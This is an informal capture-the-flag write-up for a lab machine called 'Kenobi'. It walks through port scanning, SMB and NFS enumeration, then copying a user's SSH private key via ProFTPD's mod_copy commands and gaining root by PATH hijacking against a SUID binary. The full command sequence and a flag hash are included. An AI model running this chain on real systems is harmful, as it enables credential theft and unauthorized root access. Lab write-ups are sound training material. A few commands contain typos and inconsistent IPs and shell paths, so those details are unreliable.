KENOBI

nmap --open 10.10.244.244
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 11:41 EDT
Nmap scan report for 10.10.244.244
Host is up (0.16s latency).
Not shown: 925 closed tcp ports (conn-refused), 69 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

sudo nmap -A -T4 --min-rate=5000 -v 10.10.0.198 -oN nmap.txt

but anonymous login is not allowed on the ftp port so lets continue enum

checking out the ip on port 80 gives nothing but an image, downloaded for further enum.

now lets check the samba ports 139,445

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.0.198

NB: I also used this cmd to enum the number of shares on the machine
smbclient -L //10.10.0.198/shares

now we know the shares, lets enum one 
smbclient //10.10.0.198/anonymous
we found a file on the share, lets download it recursively
smbget -R smb://10.10.0.198/anonymous

looks like the content of our downloaded file is about creating an ssh key for user kenobi to login to the server and more info about proftd server which is on port 21, let's enum further

from earliar nmap port scan there is port 111 running the service rpcbind. RPCBIND is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.0.198
found /var mount with an asterik
/var*
dont know how to acces this file yet so i'll come back to it, lets enum further

let's connect to the ftp port with netcat to find the version
netcat 10.10.0.198 21
proftpd 1.3.5
lets search for exploit
found 'mod_copy' remote command
The mod_copy module implements SITE CPFR and SITE CPTO commands (analogous to RNFR and RNTO), which can be used to copy files/directories from one place to another on the server without having to transfer the data to the client and back. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. 
read more here =http://www.proftpd.org/docs/contrib/mod_copy.html

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

first lets reconnect to the ftp server
nc 10.10.0.198 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

Lets mount the /var/tmp directory to our machine

mkdir /mnt/kenobiNFS
mount 10.10.0.198:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS

nb: always use sudo when mounting

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

cp /mnt/kenobiNFS/tmp/id_rsa
give it permission for users only
chmo 600 id_rsa

now lets login to user kenobi ssh on port 22
ssh -i id_rsa kenobi@10.10.0.198
and we found the flag at /kenobi/user.txt

PRIVESC
now lets search for suid files to escalate our privilege

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following:
find / -perm -u=s -type f 2>/dev/null

find / -perm -u=s -type f 2>/dev/null
we found /usr/bin/menu which looks odd
let's run it
looks like a program that receives an input for particular cmds and print the output
let's try to manipulate this
using the string cmd, we can  the human readable files on the binary and maybe how to manipulate it
curl -I localhost
uname -r
ifconfig
This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.
running the following cmd should help to manipulate the path to curl to get root
navigating to the /tmp folder
cd /tmp
echo /bin/bash > curl
chmod 777 curl
export PATH=/tmp:$PATH
now run the menu cmd and chooe option 1
/usr/bin/menu
we got a shell back as root

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

cat /root/root.txt
177b3cd8562289f37382721c28381f02

thank you